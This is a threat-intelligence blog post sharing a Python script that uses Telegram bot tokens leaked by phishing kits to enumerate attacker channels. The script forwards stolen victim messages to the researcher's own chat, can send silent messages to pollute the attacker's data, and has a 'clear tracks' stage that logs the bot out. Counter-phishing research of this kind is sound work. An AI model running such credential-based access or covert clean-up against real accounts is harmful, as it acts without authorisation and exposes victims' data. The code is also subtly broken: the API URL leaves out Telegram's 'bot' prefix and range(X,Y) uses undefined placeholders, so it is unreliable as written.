---
layout: phishing-campaign-default
title:  "Telegram Enumeration"
date:   2025-08-07
description: "qwerty"
author: "RedDuck"
tags: threat-intel
---

<style>

.Container {
  width: 500px;
  border-radius: 6px;
  position: relative;
  background: #282B36;
  margin: 60px auto 0 auto;
  box-shadow: 0 10px 40px 0 rgba(40,43,54,0.30);
  
  nav {
    top: 15px;
    left: 15px;
    position: absolute;
    
    a {
      z-index: 2;
      color: #A5AAAF;
      font-size: 13px;
      padding: 5px 8px;
      border-radius: 4px;
      display: inline-block;
      text-decoration: none;
      &:hover, &.active { color: white; }
    }
    
    .current {
      top: 0;
      left: 0;
      z-index: 0;
      width: 40px;
      height: 22px;
      border-radius: 3px;
      position: absolute;
      background-color: rgba(white, .2);
    }
  }
}

.Container .Contents {
  width: 100%;
  display: flex;
  overflow: hidden;
  align-items: flex-start;
}

.Container .Content {
  width: 100%;
  flex-shrink: 0;
  color: #FFFFFF;
  font-size: 15px;
  line-height: 24px;
  padding: 60px 30px 30px 30px;
  
  .hljs  {
    padding: 0; 
    font-size: 13px;
    line-height: 24px;
    font-family: Consolas, Monaco, monospace;
  }
}

.hljs-number { color: #FFC24C }

.credit {
  left: 50%;
  bottom: 30px;
  width: 300px;
  position: fixed;
  text-align: center;
  margin-left: -150px;
  
  p {
    color: #6C738B;
    font-size: 13px;
    font-weight: 300;
    line-height: 20px;
  }
  
  p a {
    color: #32325D;
    font-weight: 400;
    text-decoration: none;
  }
  
  p a:hover { color: #5C33FF; }
}
<style>

In order to facilitate research into attacks which use Telegram to exfiltrate victim information, as well as seek out the appropriate entities to which to report the crimes, we rely on using native Telegram bot API endpoints to enumerate attacker information.

Note: this requires that the attacker leaves their bot token and channel ID available, whether in a config file or a network request.

THESE WORKFLOWS SHOULD NOT BE USED AGAINST NON-ATTACKER CHANNELS. WE ONLY ANALYZE SITES SUBMITTED TO PHISHTANK.ORG, AND ARE CONFIMRED TO BE VALID PHISHES.

<div class="Container">
  <nav>
    <div class="current"></div>
    <a href="#one" class="active">Python</a>
  </nav>
  <div class="Contents">
    <div class="Content" id="one">
    <pre><code>
    from datetime import datetime
    import requests
    import time
    import os

    USING = "BOT_TOKEN1"

    BOT_TOKENS = {"BOT_TOKEN1": "{BOT-TOKEN}"}

    CHANNEL_IDS = {"BOT_TOKEN1": "{BOT-CHANNEL}"}

    MY_CHANNEL_IDS = {"BOT_TOKEN1": "{YOUR-CHANNEL}"}

</code></pre>
  </div>
  </div>
</div>

<div class="credit">
  <p>The code snippet format are taken from Stripe's <a href="https://stripe.com/docs/api#create_charge" target="_blank">incredible documentation</a></p>
</div>

<!-- ```python
from datetime import datetime
import requests
import time
import os

USING = "BOT_TOKEN1"

BOT_TOKENS = {"BOT_TOKEN1": "{BOT-TOKEN}"}

CHANNEL_IDS = {"BOT_TOKEN1": "{BOT-CHANNEL}"}

MY_CHANNEL_IDS = {"BOT_TOKEN1": "{YOUR-CHANNEL}"}

URL = f"https://api.telegram.org/{BOT_TOKENS[USING]}/" 

# Workflow that will gather data specific to the channel that the attackers are using to exfiltrate data. If the channel ID is not known, you can use 
# determine this value by interacting with the attacker's bot; the response you receive will likely contain the ID of the channel used to exfiltrate victim data
channel_endpoints = {
    "getChatAdministrators":f"getChatAdministrators?chat_id={CHANNEL_IDS[USING]}",
    "getChat":f"getChat?chat_id={CHANNEL_IDS[USING]}",
    "getChatMembersCount":f"getChatMembersCount?chat_id={CHANNEL_IDS[USING]}",
    "createChatInviteLink":f"createChatInviteLink?chat_id={CHANNEL_IDS[USING]}",
}

# Workflow that will gather data on the bot, such as 
# - Name
# - Recent updates
# - Description
# and other general information that can be used later.
gen_endpoints = {
    "getUpdates":"getUpdates",
    "getWebhookInfo":"getWebhookInfo",
    "getMe":"getMe",
    "getMyCommands":"getMyCommands",
    "getMyName":"getMyName",
    "getMyDescription":"getMyDescription",
    "getAvailableGifts":"getAvailableGifts",
    "getWebhookInfo":"getWebhookInfo",
}

# Workflow that will remove evidence of your interaction with the attacker's bot. These endpoints will
# - Leave the chat you created to enumerate stolen data
# - Close the bot
# - Log the bot out
clear_tracks = {
    "leaveChat":f"leaveChat?chat_id={MY_CHANNEL_IDS[USING]}",
    "close":f"close",
    "logOut":f"logOut"
}

# Workflow that will send data specified by you to the attacker's channel. By default, this workflow sends empty messages, and disables notifications, so as to minimize the likelihood that the attacker will immediately detect any anomolous behavior. You may use this workflow to pollute the attacker's
# dataset, enumerate channel ID(s), etc.
sendMessage = {
    "sendMessage":f"sendMessage?text=''&chat_id={MY_CHANNEL_IDS[USING]}&disable_notification=True"
}

# Workflow to enumerate what data the attackers have stolen. 
forwardMessage = {
    "forwardMessage": f"forwardMessage?chat_id={MY_CHANNEL_IDS[USING]}&from_chat_id={CHANNEL_IDS[USING]}&message_id="
}

folder = f"{USING}-{datetime.today().strftime('%m-%d-%y')}"
try:
    os.mkdir(f"{folder}")
except:
    print("Folder already exists")
os.chdir(f"{folder}")

def enumerate():
    for inc in range(X,Y): 
        for key in forwardMessage.keys():
            looking_at = key
            response = requests.get(URL+forwardMessage[looking_at]+str(inc))
            print(response.text)
            if "Too Many Requests: retry after" not in response.text and "Bad Request: message to forward not found" not in response.text:
                with open(f"{looking_at}.json","a") as a:
                    a.write(f"{response.text}\n")
    
def query_endpoint(endpoint):
    for key in endpoint.keys():
        looking_at = key
        response = requests.get(URL+endpoint[looking_at])
        print(response.text)
        if '{"ok":true' in response.text:
            with open(f"{looking_at}.json","a") as a:
                a.write(f"{response.text}\n")

def initial_recon():
    query_endpoint(gen_endpoints)
    query_endpoint(channel_endpoints)

STAGE = "3"

match STAGE:
    case "1":
        initial_recon()
    case "2":
        enumerate()
    case "3":
        query_endpoint(clear_tracks)

os.chdir("..")
``` -->